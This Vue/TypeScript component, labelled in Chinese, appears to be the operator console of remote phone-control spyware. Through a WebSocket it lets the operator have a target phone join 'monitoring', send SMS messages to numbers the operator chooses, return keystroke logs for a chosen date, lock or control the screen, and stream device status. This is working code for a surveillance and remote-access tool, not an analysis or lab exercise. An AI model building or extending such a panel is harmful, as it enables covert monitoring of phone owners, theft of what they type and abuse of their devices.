<script setup lang="ts">
import { onBeforeUnmount, onMounted, ref } from 'vue'
import { message } from 'ant-design-vue'
import {
  WifiOutlined,
  DisconnectOutlined,
  SendOutlined,
  ReloadOutlined,
} from '@ant-design/icons-vue'
import { useWebSocket, type WsEvent } from '#/composables/useWebSocket'
import { DEVICE_COMMANDS, SCREEN_COMMANDS } from '#/store/dictionary'

const props = defineProps<{ phoneId: string }>()

const ws = useWebSocket()
const events = ref<Array<{ time: string; type: string; payload: string }>>([])
const lastStatus = ref<WsEvent | null>(null)

// SMS 发送状态
const smsVisible = ref(false)
const smsNumber = ref('')
const smsText = ref('')

// 键盘记录按日期查询状态
const logdateVisible = ref(false)
const logdateDate = ref('')

let off: (() => void) | null = null

// 命令 key → 中文标签映射
const CMD_LABEL_MAP: Record<string, string> = Object.fromEntries(
  [...DEVICE_COMMANDS.map(c => [c.key, c.label]), ...SCREEN_COMMANDS.map(c => [c.comand, c.label])]
)
CMD_LABEL_MAP['SMSSEND'] = '发送短信'
CMD_LABEL_MAP['Logdate'] = '键盘记录(按日期)'
CMD_LABEL_MAP['join'] = '加入监控'
CMD_LABEL_MAP['out'] = '退出监控'
CMD_LABEL_MAP['ping'] = '心跳检测'

// 错误消息翻译
const ERROR_MSG_MAP: Record<string, string> = {
  device_offline: '设备离线',
  subcommand_blocked: '指令被拦截（高危）',
  device_not_found: '设备未找到',
  invalid_pid: '设备ID无效',
  ws_auth_failed: '认证失败',
  timeout: '超时无响应',
}

// 连接状态翻译
const LINK_STATUS_MAP: Record<string, string> = {
  OPEN: '在线',
  CLOSED: '离线',
}

function typeLabel(type: string): string {
  const map: Record<string, string> = { status: '状态', error: '错误', cmd: '指令', event: '事件' }
  return map[type] || type
}

function formatPayload(type: string, payload: unknown): string {
  if (typeof payload === 'string') return payload
  const obj = payload as Record<string, unknown>

  if (type === 'cmd') {
    const subc = String(obj.subc || '')
    const label = CMD_LABEL_MAP[subc] || subc
    if (obj.sent) return `已发送指令：${label}`
    if (obj.date) return `${label}，日期：${obj.date}`
    if (obj.to) return `${label}，发送至：${obj.to}`
    if (obj.comand) {
      const screenLabel = SCREEN_COMMANDS.find(s => s.comand === obj.comand && s.lockit === obj.lockit && s.bstate === obj.bstate)?.label || subc
      return `已发送指令：${screenLabel}`
    }
    return `已发送指令：${label}`
  }

  if (type === 'error') {
    const msg = String(obj.msg || obj.message || '未知错误')
    const translated = ERROR_MSG_MAP[msg] || msg
    const pid = obj.pid ? ` (${obj.pid})` : ''
    return `${translated}${pid}`
  }

  if (type === 'status') {
    const link = LINK_STATUS_MAP[String(obj.serverToPhone || '')] || String(obj.serverToPhone || '未知')
    const ping = obj.lastPing ? `最后心跳 ${obj.lastPing}` : '无心跳记录'
    return `设备链路：${link}，${ping}`
  }

  const text = JSON.stringify(payload)
  return text.length > 280 ? text.slice(0, 280) + '…' : text
}

function pushEvent(type: string, payload: unknown) {
  const time = new Date().toLocaleTimeString('zh-CN', { hour12: false })
  const text = formatPayload(type, payload)
  events.value.unshift({ time, type, payload: text.length > 280 ? text.slice(0, 280) + '…' : text })
  if (events.value.length > 100) events.value.length = 100
}

onMounted(() => {
  ws.connect()
  off = ws.on((ev) => {
    if (ev.type === 'statusBatch') {
      lastStatus.value = ev
      pushEvent('status', ev)
      return
    }
    if (ev.type === 'error') {
      pushEvent('error', ev)
      return
    }
    pushEvent(String(ev.type || 'event'), ev)
  })
  setTimeout(() => {
    ws.panelQuery({ subc: 'join', pid: props.phoneId })
  }, 300)
})

onBeforeUnmount(() => {
  if (props.phoneId) ws.panelQuery({ subc: 'out', pid: props.phoneId })
  off?.()
  ws.disconnect()
})

function ping() {
  if (!ws.panelQuery({ subc: 'ping', pid: props.phoneId })) {
    message.warning('WebSocket 未连接')
  }
}

function sendCommand(subc: string) {
  if (!ws.panelSend({ pid: props.phoneId, subc })) {
    message.warning('WebSocket 未连接')
    return
  }
  pushEvent('cmd', { subc, sent: true })
}

function openSmsSend() {
  if (!ws.connected.value) { message.warning('WebSocket 未连接'); return }
  smsNumber.value = ''
  smsText.value = ''
  smsVisible.value = true
}

function submitSms() {
  const numbers = smsNumber.value.trim()
  const msg = smsText.value.trim()
  if (!numbers || !msg) { message.warning('号码和内容不能为空'); return }
  numbers.split(/\s+/).forEach((n) => {
    ws.panelSend({ pid: props.phoneId, subc: 'SMSSEND', smsnumber: n, message: msg })
  })
  pushEvent('cmd', { subc: 'SMSSEND', to: numbers })
  message.success('短信指令已下发')
  smsVisible.value = false
}

function openLogdate() {
  if (!ws.connected.value) { message.warning('WebSocket 未连接'); return }
  logdateDate.value = new Date().toISOString().slice(0, 10)
  logdateVisible.value = true
}

function submitLogdate() {
  const d = logdateDate.value.trim()
  if (!d) { message.warning('请选择日期'); return }
  ws.panelSend({ pid: props.phoneId, subc: 'Logdate', keylogtype: '0', keylogdate: d })
  pushEvent('cmd', { subc: 'Logdate', date: d })
  message.success('键盘记录查询已下发')
  logdateVisible.value = false
}

function sendScreenCmd(a: typeof SCREEN_COMMANDS[0]) {
  if (!ws.connected.value) { message.warning('WebSocket 未连接'); return }
  const extra: Record<string, string> = { comand: a.comand }
  if (a.lockit !== undefined) extra.lockit = a.lockit
  if (a.bstate !== undefined) extra.bstate = a.bstate
  ws.panelSend({ pid: props.phoneId, subc: 'screen', ...extra })
  pushEvent('cmd', { subc: 'screen', ...extra })
}

const commandGroups = DEVICE_COMMANDS.reduce<Record<string, typeof DEVICE_COMMANDS>>((acc, c) => {
  ;(acc[c.group] = acc[c.group] || []).push(c)
  return acc
}, {})
</script>

<template>
  <div class="control">
    <div class="status-bar">
      <a-tag v-if="ws.connected.value" color="blue">
        <WifiOutlined /> WS 已连接
      </a-tag>
      <a-tag v-else-if="ws.reconnecting.value" color="orange">重连中…</a-tag>
      <a-tag v-else color="default">
        <DisconnectOutlined /> 未连接
      </a-tag>
      <a-divider type="vertical" />
      <span class="dim">设备链路：</span>
      <a-tag v-if="lastStatus?.serverToPhone === 'OPEN'" color="blue">在线</a-tag>
      <a-tag v-else-if="lastStatus" color="default">离线</a-tag>
      <a-tag v-else color="default">未知</a-tag>
      <span v-if="lastStatus?.lastPing" class="dim ml">
        最后心跳 {{ lastStatus.lastPing }}
      </span>
      <div class="grow" />
      <a-button size="small" @click="ping">
        <ReloadOutlined /> 刷新状态
      </a-button>
    </div>

    <!-- 普通指令组 -->
    <a-card title="命令面板" :bordered="false" class="cmd-card">
      <p class="dim">部分高危子命令已被后端 ws_blocked_subcommands 拦截，发出后会返回 subcommand_blocked。</p>
      <div v-for="(items, group) in commandGroups" :key="group" class="cmd-group">
        <div class="group-label">{{ group }}</div>
        <a-space wrap>
          <a-button
            v-for="cmd in items"
            :key="cmd.key"
            :disabled="!ws.connected.value"
            @click="sendCommand(cmd.key)"
          >
            <SendOutlined /> {{ cmd.label }}
          </a-button>
        </a-space>
      </div>

      <!-- 需要输入参数的指令 -->
      <div class="cmd-group">
        <div class="group-label">需要输入参数</div>
        <a-space wrap>
          <a-button :disabled="!ws.connected.value" @click="openSmsSend">
            <SendOutlined /> 发送短信
          </a-button>
          <a-button :disabled="!ws.connected.value" @click="openLogdate">
            <SendOutlined /> 键盘记录（按日期）
          </a-button>
        </a-space>
      </div>

      <!-- 屏幕控制 -->
      <div class="cmd-group">
        <div class="group-label">屏幕控制</div>
        <a-space wrap>
          <a-button
            v-for="a in SCREEN_COMMANDS"
            :key="a.label"
            :disabled="!ws.connected.value"
            @click="sendScreenCmd(a)"
          >
            {{ a.label }}
          </a-button>
        </a-space>
      </div>
    </a-card>

    <!-- 实时事件流 -->
    <a-card title="实时事件流" :bordered="false" class="log-card">
      <div v-if="events.length === 0" class="empty">尚无事件 — 点击「刷新状态」或发送命令</div>
      <ul v-else class="event-list">
        <li v-for="(e, i) in events" :key="i">
          <span class="time">{{ e.time }}</span>
          <a-tag :color="e.type === 'error' ? 'red' : e.type === 'cmd' ? 'pink' : 'blue'">
            {{ typeLabel(e.type) }}
          </a-tag>
          <span class="payload">{{ e.payload }}</span>
        </li>
      </ul>
    </a-card>

    <!-- SMS 发送弹窗 -->
    <a-modal
      v-model:open="smsVisible"
      title="发送短信"
      ok-text="下发"
      cancel-text="取消"
      @ok="submitSms"
    >
      <a-form layout="vertical">
        <a-form-item label="接收号码（多个用空格分隔）">
          <a-input v-model:value="smsNumber" placeholder="+8613800000000" allow-clear />
        </a-form-item>
        <a-form-item label="短信内容">
          <a-textarea v-model:value="smsText" :rows="4" placeholder="输入短信内容…" />
        </a-form-item>
      </a-form>
    </a-modal>

    <!-- 键盘记录按日期查询弹窗 -->
    <a-modal
      v-model:open="logdateVisible"
      title="键盘记录（按日期）"
      ok-text="查询"
      cancel-text="取消"
      @ok="submitLogdate"
    >
      <a-form layout="vertical">
        <a-form-item label="查询日期">
          <a-input v-model:value="logdateDate" type="date" />
        </a-form-item>
      </a-form>
    </a-modal>
  </div>
</template>

<style scoped>
.control { display: flex; flex-direction: column; gap: 14px; }
.status-bar {
  display: flex;
  align-items: center;
  gap: 6px;
  padding: 10px 14px;
  background: var(--bg-2);
  border-radius: var(--radius-sm);
}
.dim { color: var(--text-2); font-size: 13px; }
.ml { margin-left: 8px; }
.grow { flex: 1; }
.cmd-group { margin-top: 14px; }
.cmd-group:first-of-type { margin-top: 6px; }
.group-label { font-size: 12px; color: var(--text-2); letter-spacing: 0.12em; margin-bottom: 8px; }
.cmd-card, .log-card { background: var(--bg-1); border: 1px solid var(--border-soft); }
.log-card .empty { color: var(--text-3); font-size: 13px; }
.event-list {
  list-style: none;
  padding: 0;
  margin: 0;
  max-height: 360px;
  overflow-y: auto;
  font-size: 12px;
}
.event-list li {
  display: flex;
  align-items: flex-start;
  gap: 8px;
  padding: 6px 0;
  border-bottom: 1px dashed var(--border-soft);
}
.event-list li .payload {
  color: var(--text-1);
  word-break: break-all;
  font-size: 12px;
}
.time {
  color: var(--text-3);
  font-family: 'Menlo', 'Consolas', monospace;
  flex-shrink: 0;
}
</style>
